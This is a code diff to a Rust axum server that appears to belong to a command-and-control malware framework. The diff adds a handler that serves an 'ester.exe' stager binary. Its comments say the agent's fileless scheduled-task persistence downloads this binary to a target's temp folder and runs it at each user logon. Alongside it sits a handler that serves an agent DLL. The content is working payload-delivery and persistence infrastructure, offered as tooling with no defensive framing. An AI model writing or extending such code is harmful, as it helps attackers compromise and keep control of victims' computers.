@@ -772,3 +772,51 @@ pub async fn download_agent_dll() -> impl axum::response::IntoResponse {
         response,
     )
 }
+
+/// Serve the ester.exe stager binary (plain bytes, no XOR).
+///
+/// The fileless scheduled-task persistence in the agent downloads this file
+/// to a temp path on the target and executes it on every user logon.
+/// Expected build artefact: `dist/ester.exe` (produced by build-multistage.ps1).
+pub async fn download_ester() -> impl axum::response::IntoResponse {
+    use axum::http::{header, StatusCode};
+    use std::fs;
+
+    let search_paths = ["dist/ester.exe", "ester.exe"];
+    let found = search_paths
+        .iter()
+        .find(|p| std::path::Path::new(p).exists());
+
+    let payload = match found {
+        Some(path) => {
+            tracing::info!("Serving ester from: {}", path);
+            match fs::read(path) {
+                Ok(b) => b,
+                Err(e) => {
+                    tracing::error!("Failed to read ester from {}: {}", path, e);
+                    return (
+                        StatusCode::INTERNAL_SERVER_ERROR,
+                        [(header::CONTENT_TYPE, "application/octet-stream")],
+                        format!("ERROR:{}", e).into_bytes(),
+                    );
+                }
+            }
+        }
+        None => {
+            tracing::error!("ester.exe not found; run build-multistage.ps1 first to build the stager");
+            return (
+                StatusCode::NOT_FOUND,
+                [(header::CONTENT_TYPE, "application/octet-stream")],
+                b"ERROR:ester.exe not built".to_vec(),
+            );
+        }
+    };
+
+    tracing::info!("Serving ester.exe ({} bytes)", payload.len());
+
+    (
+        StatusCode::OK,
+        [(header::CONTENT_TYPE, "application/octet-stream")],
+        payload,
+    )
+}
